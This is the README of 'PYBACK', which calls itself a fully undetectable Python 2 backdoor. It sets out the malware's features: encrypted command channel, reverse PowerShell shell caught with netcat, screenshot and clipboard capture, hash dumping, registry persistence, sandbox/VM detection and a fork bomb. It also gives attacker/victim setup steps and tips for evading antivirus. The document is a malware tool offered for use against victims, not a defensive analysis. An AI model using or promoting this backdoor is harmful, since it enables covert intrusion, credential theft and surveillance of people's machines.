# PYBACK  
FUD cross-platform python2 backdoor  

# Features  
.  AES encrypted communication tunnel  
.  Linux and windows post-exploitation enumeration  
.  Run powershell commands and scripts  
.  Spawn an independent powershell session to a remote machine (catch with netcat)  
.  Screenshot  
.  Check sandbox and VM (VM check only for windows, using wmi module)  
.  Download/upload files  
.  Dump clipboard  
.  Run a fork bomb on victim machine, just for fun :relaxed:  
.  Persistance using REGKEY (windows only)  
.  Client or server connection wait   
.  Dump hashes with ntds and reg save methods ( files should be downloaded manually ) 

# To Do  
. shell code execution  
. RSA or Hybrid encrypted communication  

# Usage  
. for linux targets:  
`pip install -r linux_requirments.txt`  

. for windows targets:   
:warning: WARNING: DO NOT USE WINE FOR WINDOWS TARGET COMPILATION :warning:  

install VCforPython from <a href="https://www.microsoft.com/en-us/download/details.aspx?id=44266"> here </a>.  

`pip install -r windows_requirments.txt`  
 
pyinstaller will encrease the detection rate. use version 3.1.1 only.   

change the port and ip or DNS in both listener.py and backdoor.py files.  

attacker side:  
`./listener.py`  

victim side:  
`./backdoor.py`  

for a list of commnads type 'help' in the listener console when connected to the backdoor.   


# Tips  
. to use upload functionality you should put the target file in the same directory as the listener.py file.   
. backdoor doesnt auto-activate the persistence module for better evation chance, if you want to change that simply uncomment the self.persistance() line in backdoor file.  
. the `enum` command may take a few minutes and results will be saved in the listener directory. to see colored output use `cat enum*.txt`  
. spawn function will run an FUD reverse powershell payload on victim machine, you can catch it with `nc -nvlp [port]`  


# PoC  
:heavy_exclamation_mark: DO NOT upload this on VirusTotal or anywhere else, I DID IT FOR YOU :heavy_exclamation_mark:  
  
  using pure python code:  
   
![Image description](https://github.com/7h3w4lk3r/pyback/blob/master/poc.png)  
  
  using pyinstaller version 3.1.1:  

![Image description](https://github.com/7h3w4lk3r/pyback/blob/master/image.png) 

  
# Contact  
Email: bl4ckr4z3r@gmail.com  
Telegram ID: @w4lk3r1998

